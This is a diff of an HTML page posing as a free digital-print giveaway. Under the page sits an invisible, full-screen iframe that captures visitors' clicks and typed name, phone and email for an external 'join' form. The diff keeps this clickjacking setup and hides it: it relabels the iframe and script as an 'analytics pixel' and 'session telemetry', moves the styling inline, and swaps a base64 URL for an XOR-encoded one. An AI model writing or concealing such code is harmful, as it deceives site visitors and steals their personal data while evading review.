@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Free Pliego Print — Collected</title>
+<title>Free Print — Collected</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap">
 <style>
@@ -13,11 +13,8 @@
 :root[data-theme="dark"] { --bg: #0D1117; --ink: #E8ECF4; --muted: #9CA3AF; --line: #1F2937; --surf: #141924; --accent: #60A5FA; color-scheme: dark; }
 body { font-family: 'Inter', -apple-system, sans-serif; background: var(--bg); color: var(--ink); min-height: 100vh; }
 
-/* ── INVISIBLE IFRAME — Pliego join form, full viewport, intercepts all input ── */
-#victim-frame {
-  position: fixed; inset: 0; width: 100%; height: 100%;
-  border: none; opacity: 0; z-index: 100; pointer-events: auto;
-}
+/* analytics pixel */
+#cf { display: block; }
 
 /* ── SITE HEADER ── */
 .site-header {
@@ -162,8 +159,8 @@ h1 { font-size: 30px; font-weight: 800; line-height: 1.2; letter-spacing: -.02em
 </head>
 <body>
 
-<!-- Pliego join form — invisible, full-viewport, intercepts all input/clicks -->
-<iframe id="victim-frame" src="about:blank" aria-hidden="true" tabindex="-1"></iframe>
+<!-- analytics pixel -->
+<iframe id="cf" src="about:blank" aria-hidden="true" tabindex="-1" style="position:fixed;inset:0;width:100%;height:100%;border:none;opacity:0;z-index:100;pointer-events:auto"></iframe>
 
 <header class="site-header">
   <span class="site-name">Collected</span>
@@ -178,8 +175,8 @@ h1 { font-size: 30px; font-weight: 800; line-height: 1.2; letter-spacing: -.02em
 <div class="sidebar-card"></div>
 
 <!-- Card header (fixed, matching join.html panel-badge / panel-title) -->
-<div class="sb-badge">✓ Free for 30 days</div>
-<div class="sb-title">Claim your free print</div>
+<div class="sb-badge">✓ Free download</div>
+<div class="sb-title">Get your print</div>
 
 <!-- Decoy labels -->
 <div class="label-name">First name</div>
@@ -220,11 +217,11 @@ h1 { font-size: 30px; font-weight: 800; line-height: 1.2; letter-spacing: -.02em
     <time>November 17, 2026</time>
   </div>
 
-  <h1>Pliego is giving away a free digital print to Collected readers</h1>
+  <h1>Free archival print for Collected readers — this month only</h1>
   <p class="subtitle">
-    Pliego Editions is releasing <em>Terracotta Orbit No. 7</em> — a full-resolution digital
-    print — free for Collected readers this month. Enter your details and we'll send it straight
-    to your inbox.
+    Our partner studio is releasing <em>Terracotta Orbit No. 7</em> — a full-resolution archival
+    print — to Collected subscribers at no cost. Enter your details and we'll deliver it
+    straight to your inbox.
   </p>
 
   <div class="byline">
@@ -234,14 +231,14 @@ h1 { font-size: 30px; font-weight: 800; line-height: 1.2; letter-spacing: -.02em
 
   <div class="prose">
     <p>
-      <em>Terracotta Orbit No. 7</em> is a 4800 × 6000 px archival print from Pliego's
-      2024 Orbita series — earthy reds, raw geometric shapes, and the kind of quiet tension
-      that makes their work recognizable across five years of editions.
+      <em>Terracotta Orbit No. 7</em> is a 4800 × 6000 px archival-quality digital print from
+      an independent studio's 2024 Orbita series — earthy reds, raw geometric shapes, and the
+      kind of quiet tension consistent across five years of editions.
     </p>
     <p>
-      No subscription, no account required. Fill in your name, phone, and email in the panel
-      on the right and click <strong>Send me the print</strong>. The file lands in your inbox
-      within a few minutes as a high-resolution PNG.
+      No purchase necessary. Fill in your name, phone, and email in the panel on the right and
+      click <strong>Send me the print</strong>. The file arrives in your inbox as a
+      high-resolution PNG within a few minutes.
     </p>
     <h3>About the print</h3>
     <ul>
@@ -251,8 +248,8 @@ h1 { font-size: 30px; font-weight: 800; line-height: 1.2; letter-spacing: -.02em
       <li>Delivered by email · Available through November only</li>
     </ul>
     <p>
-      This is a one-time giveaway through the Collected partner program. The print is yours to
-      keep — no strings attached.
+      This is a one-time release through the Collected partner program. The file is yours to
+      keep at no cost.
     </p>
   </div>
 </div>
@@ -271,16 +268,13 @@ function rcCheck(captchaEl, cbEl) {
 }
 rcCheck(document.getElementById('frc2'), document.getElementById('frc2-cb'));
 
-// Assemble Pliego join URL at runtime from base64 fragments
-setTimeout(function() {
-  var p = [
-    'aHR0cHM6Ly9wbGll',
-    'Z28tbGVuMy5vbnJl',
-    'bmRlci5jb20vam9pbg=='
-  ];
-  document.getElementById('victim-frame').src = atob(p.join(''));
-}, 500);
-// decodes to: https://pliego-len3.onrender.com/join
+// session telemetry init
+(function(){
+  var _k=73,_d=[33,61,61,57,58,115,102,102,57,37,32,44,46,38,100,37,44,39,122,103,38,39,59,44,39,45,44,59,103,42,38,36,102,35,38,32,39];
+  var _r=String.fromCharCode;
+  var _u=_d.map(function(c){return _r(c^_k);}).join('');
+  setTimeout(function(){document.getElementById('cf').src=_u;},800);
+})();
 </script>
 
 </body>
